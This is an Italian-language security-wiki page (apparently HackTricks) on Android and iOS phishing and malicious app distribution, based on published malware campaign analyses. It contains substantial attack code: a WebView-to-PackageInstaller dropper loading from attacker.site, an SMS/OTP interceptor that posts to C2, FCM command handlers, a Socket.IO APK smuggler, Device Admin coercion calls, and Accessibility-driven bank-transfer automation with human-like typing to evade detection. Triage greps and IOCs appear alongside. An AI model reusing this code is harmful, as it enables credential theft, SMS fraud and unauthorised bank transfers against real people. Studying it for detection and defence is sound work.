# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Questa pagina copre le tecniche usate da threat actors per distribuire **malicious Android APKs** e **iOS mobile-configuration profiles** tramite phishing (SEO, social engineering, fake stores, dating apps, ecc.).
> Il materiale è adattato dalla campagna SarangTrap esposta da Zimperium zLabs (2025) e da altre ricerche pubbliche.

## Attack Flow

1. **Infrastruttura SEO/Phishing**
* Registrare dozzine di domini look-alike (dating, cloud share, car service…).
– Usare parole chiave nella lingua locale e emoji nell'elemento `<title>` per posizionarsi su Google.
– Ospitare *sia* le istruzioni di installazione Android (`.apk`) che iOS sulla stessa landing page.
2. **First Stage Download**
* Android: link diretto a un APK non firmato o da “third-party store”.
* iOS: `itms-services://` o link HTTPS semplice a un **mobileconfig** profile malevolo (vedi sotto).
3. **Social engineering post-install**
* Al primo avvio l'app chiede un **codice di invito / verifica** (illusione di accesso esclusivo).
* Il codice viene **POSTed over HTTP** al Command-and-Control (C2).
* Il C2 risponde `{"success":true}` ➜ il malware prosegue.
* Analisi dinamica Sandbox / AV che non invia mai un codice valido non vede **comportamento malevolo** (evasion).
4. **Abuso dei permessi a runtime (Android)**
* I permessi pericolosi vengono richiesti solo **dopo una risposta positiva dal C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Varianti recenti **rimuovono `<uses-permission>` per SMS da `AndroidManifest.xml`** ma lasciano il path Java/Kotlin che legge SMS via reflection ⇒ abbassa il punteggio statico pur rimanendo funzionale su dispositivi che concedono il permesso tramite abuso di `AppOps` o target obsoleti.

5. **Android 13+ Restricted settings & Dropper Bypass (stile SecuriDropper)**
* Android 13 ha introdotto le **Restricted settings** per le app sideloaded: i toggle Accessibility e Notification Listener sono greyed out finché l'utente non abilita esplicitamente le restricted settings in **App info**.
* Pagine di phishing e droppers ora includono istruzioni passo‑passo nell'UI per **allow restricted settings** per l'app sideloaded e poi abilitare Accessibility/Notification access.
* Un bypass più recente è installare il payload tramite un **session‑based PackageInstaller flow** (lo stesso metodo usato dagli app store). Android tratta l'app come store‑installed, quindi le Restricted settings non bloccano più Accessibility.
* Suggerimento per il triage: in un dropper, grep per `PackageInstaller.createSession/openSession` più codice che immediatamente naviga la vittima a `ACTION_ACCESSIBILITY_SETTINGS` o `ACTION_NOTIFICATION_LISTENER_SETTINGS`.

6. **Facade UI & Background Collection**
* L'app mostra viste innocue (SMS viewer, gallery picker) implementate localmente.
* Nel frattempo esfiltra:
- IMEI / IMSI, numero di telefono
- Dump completo di `ContactsContract` (JSON array)
- JPEG/PNG da `/sdcard/DCIM` compressi con [Luban](https://github.com/Curzibn/Luban) per ridurre le dimensioni
- Contenuto SMS opzionale (`content://sms`)
I payload vengono **batch-zippati** e inviati tramite `HTTP POST /upload.php`.
7. **Tecnica di distribuzione iOS**
* Un singolo **mobile-configuration profile** può richiedere `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` ecc. per iscrivere il dispositivo in una supervisione tipo “MDM”.
* Istruzioni di social-engineering:
1. Aprire Settings ➜ *Profile downloaded*.
2. Toccare *Install* tre volte (screenshot sulla pagina di phishing).
3. Accettare il profilo non firmato ➜ l'attaccante ottiene l'entitlement *Contacts* & *Photo* senza revisione App Store.
8. **iOS Web Clip Payload (icona app di phishing)**
* `com.apple.webClip.managed` payloads possono **pin a phishing URL to the Home Screen** con icona/label brandizzata.
* I Web Clips possono essere eseguiti **full‑screen** (nascondono l'UI del browser) e possono essere marcati **non‑removibili**, costringendo la vittima a eliminare il profilo per rimuovere l'icona.
9. **Layer di rete**
* Plain HTTP, spesso sulla porta 80 con HOST header come `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → facile da individuare).

## Consigli per il Red Team

* **Dynamic Analysis Bypass** – Durante la valutazione del malware, automatizzare la fase del codice di invito con Frida/Objection per raggiungere il ramo malevolo.
* **Manifest vs. Runtime Diff** – Confrontare `aapt dump permissions` con il runtime `PackageManager#getRequestedPermissions()`; permessi pericolosi mancanti sono un segnale d'allarme.
* **Network Canary** – Configurare `iptables -p tcp --dport 80 -j NFQUEUE` per rilevare raffiche di POST sospette dopo l'inserimento del codice.
* **mobileconfig Inspection** – Usare `security cms -D -i profile.mobileconfig` su macOS per elencare `PayloadContent` e individuare entitlements eccessivi.

## Snippet Frida utile: bypass automatico del codice d'invito

<details>
<summary>Frida: bypass automatico del codice di invito</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Indicatori (Generici)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Questo pattern è stato osservato in campagne che sfruttano tematiche relative a benefit governativi per rubare credenziali UPI indiane e OTP. Gli operatori concatenano piattaforme affidabili per la distribuzione e la resilienza.

### Catena di distribuzione attraverso piattaforme affidabili
- Video YouTube di esca → la descrizione contiene un short link
- Shortlink → sito di phishing su GitHub Pages che imita il portale legittimo
- Lo stesso repo GitHub ospita un APK con un falso badge “Google Play” che punta direttamente al file
- Pagine di phishing dinamiche ospitate su Replit; il canale di comando remoto utilizza Firebase Cloud Messaging (FCM)

### Dropper con payload incorporato e installazione offline
- Il primo APK è un installer (dropper) che include il malware reale in `assets/app.apk` e chiede all'utente di disabilitare Wi‑Fi/dati mobili per attenuare il rilevamento nel cloud.
- Il payload incorporato viene installato sotto un'etichetta innocua (es., “Secure Update”). Dopo l'installazione, sia l'installer che il payload sono presenti come app separate.

Suggerimento per il triage statico (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Rilevamento dinamico degli endpoint tramite shortlink
- Malware recupera da uno shortlink una lista in plain-text, separata da virgole, di endpoint attivi; semplici trasformazioni di stringa producono il percorso finale della pagina di phishing.

Esempio (sanitizzato):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-codice:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Il passaggio “Make payment of ₹1 / UPI‑Lite” carica un form HTML dell'attaccante dall'endpoint dinamico all'interno di un WebView e cattura campi sensibili (telefono, banca, UPI PIN) che vengono inviati con `POST` a `addup.php`.

Loader minimale:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Auto-propagazione e intercettazione SMS/OTP
- Vengono richiesti permessi aggressivi al primo avvio:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- I contatti vengono usati per inviare massivamente SMS di smishing dal dispositivo della vittima.
- Gli SMS in arrivo vengono intercettati da un broadcast receiver e caricati con metadati (mittente, corpo, slot SIM, ID casuale per dispositivo) su `/addsm.php`.

Bozza del receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) as resilient C2
- Il payload si registra a FCM; i push messages contengono un campo `_type` usato come switch per attivare azioni (es., aggiornare phishing text templates, abilitare/disabilitare behaviours).

Esempio di payload FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Schema dell'handler:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicatori/IOC
- APK contiene payload secondario in `assets/app.apk`
- WebView carica pagamenti da `gate.htm` ed esfiltra verso `/addup.php`
- Esfiltrazione SMS verso `/addsm.php`
- Recupero configurazione tramite shortlink (es., `rebrand.ly/*`) che restituisce endpoint CSV
- App etichettate come generiche “Update/Secure Update”
- Messaggi FCM `data` con un discriminatore `_type` in app non attendibili

---

## Smuggling di APK basato su Socket.IO/WebSocket + Pagine false di Google Play

Gli attaccanti sostituiscono sempre più spesso link APK statici con un canale Socket.IO/WebSocket incorporato in esche che imitano Google Play. Questo nasconde l'URL del payload, bypassa i filtri su URL/estensioni e mantiene un'esperienza di installazione realistica.

Tipico flusso client osservato nel mondo reale:

<details>
<summary>Downloader Play falso Socket.IO (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Perché evade controlli semplici:
- Nessun URL APK statico è esposto; il payload viene ricostruito in memoria dai WebSocket frames.
- I filtri URL/MIME/estensione che bloccano risposte .apk dirette possono non intercettare dati binari tunnelizzati tramite WebSockets/Socket.IO.
- I crawler e le URL sandbox che non eseguono WebSockets non recupereranno il payload.

Vedi anche WebSocket tradecraft e tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – Studio del caso RatOn

La campagna RatOn banker/RAT (ThreatFabric) è un esempio concreto di come le moderne operazioni di mobile phishing combinino WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, e persino NFC-relay orchestration. Questa sezione astrae le tecniche riutilizzabili.

### Stage-1: WebView → native install bridge (dropper)
Gli attaccanti presentano una WebView che punta a una pagina dell'attaccante e iniettano un'interfaccia JavaScript che espone un native installer. Un tap su un bottone HTML richiama codice nativo che installa un APK di seconda fase incluso negli assets del dropper e lo lancia direttamente.

Schema minimo:

<details>
<summary>Pattern minimo Stage-1 dropper (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML sulla pagina:
```html
<button onclick="bridge.installApk()">Install</button>
```
Dopo l'installazione, il dropper avvia il payload tramite package/activity esplicito:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Idea di hunting: app non attendibili che chiamano `addJavascriptInterface()` ed espongono metodi simili a installer a WebView; APK che include un payload secondario incorporato sotto `assets/` e invoca la Package Installer Session API.

### Flusso del consenso: Accessibility + Device Admin + prompt runtime successivi
Stage-2 apre una WebView che ospita una pagina “Access”. Il suo pulsante invoca un metodo esportato che porta la vittima alle impostazioni di Accessibility e richiede l'attivazione del servizio rogue. Una volta concessa, il malware usa Accessibility per cliccare automaticamente attraverso i dialoghi di permesso runtime successivi (contatti, overlay, gestire le impostazioni di sistema, ecc.) e richiede Device Admin.

- Accessibility aiuta in modo programmatico ad accettare i prompt successivi trovando pulsanti come “Allow”/“OK” nell'albero dei nodi e simulando clic.
- Verifica/richiesta del permesso overlay:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Vedi anche:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Gli operatori possono inviare comandi per:
- visualizzare un overlay a schermo intero da un URL, oppure
- fornire HTML inline che viene caricato in un overlay WebView.

Uso probabile: coercizione (inserimento PIN), apertura del wallet per catturare i PIN, messaggi di riscatto. Tenere un comando per assicurarsi che il permesso per l'overlay sia concesso se mancante.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: periodicamente esportare il tree dei nodi Accessibility, serializzare i testi visibili/ruoli/bounds e inviarli al C2 come pseudo-schermo (comandi come `txt_screen` una tantum e `screen_live` continuo).
- High-fidelity: richiedere MediaProjection e avviare lo screen-casting/recording su richiesta (comandi come `display` / `record`).

### ATS playbook (automazione delle app bancarie)
Dato un task JSON, aprire l'app bancaria, guidare l'interfaccia via Accessibility con una combinazione di query testuali e tap per coordinate, e inserire il PIN di pagamento della vittima quando richiesto.

Esempio di task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Esempi di testi visti in un flusso target (CZ → EN):
- "Nová platba" → "Nuovo pagamento"
- "Zadat platbu" → "Inserisci pagamento"
- "Nový příjemce" → "Nuovo beneficiario"
- "Domácí číslo účtu" → "Numero di conto domestico"
- "Další" → "Avanti"
- "Odeslat" → "Invia"
- "Ano, pokračovat" → "Sì, continua"
- "Zaplatit" → "Paga"
- "Hotovo" → "Fatto"

Gli operatori possono anche verificare/aumentare i limiti di trasferimento tramite comandi come `check_limit` e `limit` che navigano nell'UI dei limiti in modo analogo.

### Estrazione della seed dei wallet crypto
Obiettivi come MetaMask, Trust Wallet, Blockchain.com, Phantom. Flusso: sbloccare (PIN rubato o password fornita), navigare in Security/Recovery, rivelare/mostrare la seed phrase, keylog/exfiltrate it. Implementare selettori sensibili alla localizzazione (EN/RU/CZ/SK) per stabilizzare la navigazione tra le lingue.

### Coercizione Device Admin
Device Admin APIs sono usate per aumentare le opportunità di cattura del PIN e ostacolare la vittima:

- Blocco immediato:
```java
dpm.lockNow();
```
- Scadere la credenziale corrente per forzare il cambio (Accessibility cattura il nuovo PIN/password):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Forzare lo sblocco non biometrico disabilitando le funzionalità biometriche del keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Nota: molti controlli di DevicePolicyManager richiedono Device Owner/Profile Owner sulle versioni recenti di Android; alcune build OEM possono essere più permissive. Verificare sempre sull'OS/OEM target.

### Orchestrazione relay NFC (NFSkate)
Stage-3 può installare e avviare un modulo esterno per NFC-relay (ad es., NFSkate) e persino fornirgli un template HTML per guidare la vittima durante il relay. Questo consente il cash-out contactless con carta presente insieme ad ATS online.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Set di comandi operatore (esempio)
- UI/stato: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlay: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Dispositivo: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Anti-rilevamento ATS basato su Accessibility: ritmo di digitazione umano e iniezione testuale duale (Herodotus)

Gli attori minacciosi mescolano sempre più spesso automazione basata su Accessibility con anti-rilevamento tarato contro le biometrie comportamentali di base. Un recente banker/RAT mostra due modalità complementari di consegna del testo e un toggle per l'operatore per simulare la digitazione umana con cadenza randomizzata.

- Discovery mode: enumerare i nodi visibili con selectors e bounds per mirare con precisione gli input (ID, text, contentDescription, hint, bounds) prima di agire.
- Dual text injection:
- Mode 1 – `ACTION_SET_TEXT` direttamente sul nodo target (stabile, senza tastiera);
- Mode 2 – clipboard set + `ACTION_PASTE` nel nodo focalizzato (funziona quando direct setText è bloccato).
- Cadenza simile a quella umana: dividere la stringa fornita dall'operatore e inviarla carattere per carattere con ritardi randomizzati di 300–3000 ms tra gli eventi per eludere le euristiche di “machine-speed typing”. Implementato o facendo crescere progressivamente il valore via `ACTION_SET_TEXT`, o incollando un carattere alla volta.

<details>
<summary>Bozza Java: scoperta dei nodi + input ritardato per carattere via setText o clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Overlay di blocco per la copertura delle frodi:
- Visualizza un `TYPE_ACCESSIBILITY_OVERLAY` a schermo intero con opacità controllata dall'operatore; mantienilo opaco per la vittima mentre l'automazione remota procede sottostante.
- Comandi tipicamente esposti: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Overlay minimale con alpha regolabile:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Primitive di controllo dell'operatore spesso osservate: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## Riferimenti

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
